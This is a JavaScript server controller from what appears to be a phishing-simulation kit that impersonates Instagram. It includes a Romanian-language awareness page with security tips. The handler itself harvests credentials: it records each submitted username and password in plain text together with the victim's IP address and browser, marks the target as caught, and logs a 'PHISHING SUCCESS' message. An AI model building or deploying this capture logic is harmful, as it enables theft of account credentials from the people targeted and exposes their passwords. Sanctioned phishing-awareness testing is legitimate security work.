const { runQuery, getOne } = require('../config/database');


const captureData = async (req, res) => {
    const { trackingId } = req.params;
    const { username, password } = req.body;
    
    try {
       
        const target = await getOne(
            'SELECT * FROM targets WHERE tracking_id = ?',
            [trackingId]
        );
        
        if (!target) {
            return res.redirect('https://www.instagram.com');
        }
        
     
        if (username && password) {
           
            await runQuery(
                `INSERT INTO tracking_events (target_id, event_type, ip_address, user_agent, extra_data) 
                 VALUES (?, 'credentials', ?, ?, ?)`,
                [
                    target.id,
                    req.ip || req.connection.remoteAddress,
                    req.headers['user-agent'] || '',
                    JSON.stringify({ username, password })
                ]
            );
            
         
            await runQuery(
                'UPDATE targets SET status = "clicked", clicked_at = CURRENT_TIMESTAMP WHERE id = ?',
                [target.id]
            );
            
          
            console.log(`🎣 PHISHING SUCCESS: ${target.email} - Username: ${username}`);
        }
        
       
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Atenție - Test Phishing</title>
                <meta charset="UTF-8">
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background-color: #f0f0f0;
                    }
                    .warning {
                        background: white;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 0 20px rgba(0,0,0,0.1);
                        text-align: center;
                        max-width: 500px;
                    }
                    .warning h1 {
                        color: #e74c3c;
                        margin-bottom: 20px;
                    }
                    .warning h2 {
                        color: #e67e22;
                        margin-bottom: 20px;
                    }
                    .warning p {
                        color: #333;
                        line-height: 1.6;
                        margin-bottom: 20px;
                    }
                    .tips {
                        background: #f8f9fa;
                        padding: 20px;
                        border-radius: 5px;
                        margin-top: 20px;
                        text-align: left;
                    }
                    .tips h3 {
                        color: #2c3e50;
                        margin-bottom: 10px;
                    }
                    .tips ul {
                        margin-left: 20px;
                    }
                    .tips li {
                        margin-bottom: 10px;
                        color: #555;
                    }
                    .button {
                        display: inline-block;
                        padding: 12px 30px;
                        background: #3498db;
                        color: white;
                        text-decoration: none;
                        border-radius: 5px;
                        margin-top: 20px;
                    }
                    .button:hover {
                        background: #2980b9;
                    }
                </style>
            </head>
            <body>
                <div class="warning">
                    <h1>⚠️ ATENȚIE!</h1>
                    <h2>Tocmai ai căzut într-o capcană de phishing!</h2>
                    <p><strong>Aceasta a fost o simulare educațională.</strong></p>
                    <p>Dacă acesta ar fi fost un atac real, datele tale de autentificare ar fi fost compromise și hackerii ar fi avut acces la contul tău Instagram.</p>
                    
                    <div class="tips">
                        <h3>🛡️ Cum să te protejezi pe viitor:</h3>
                        <ul>
                            <li><strong>Verifică URL-ul:</strong> Întotdeauna verifică că ești pe site-ul oficial (instagram.com)</li>
                            <li><strong>Caută HTTPS:</strong> Site-urile legitime folosesc conexiuni securizate</li>
                            <li><strong>Nu da click pe linkuri din email:</strong> Accesează direct site-ul oficial</li>
                            <li><strong>Verifică expeditorul:</strong> Instagram nu trimite astfel de emailuri</li>
                            <li><strong>Activează 2FA:</strong> Folosește autentificarea în doi pași pentru securitate extra</li>
                        </ul>
                    </div>
                    
                    <a href="https://www.instagram.com" class="button">Mergi la Instagram real</a>
                </div>
            </body>
            </html>
        `);
        
    } catch (error) {
        console.error('Eroare la captură date:', error);
        res.redirect('https://www.instagram.com');
    }
};

module.exports = {
    captureData
};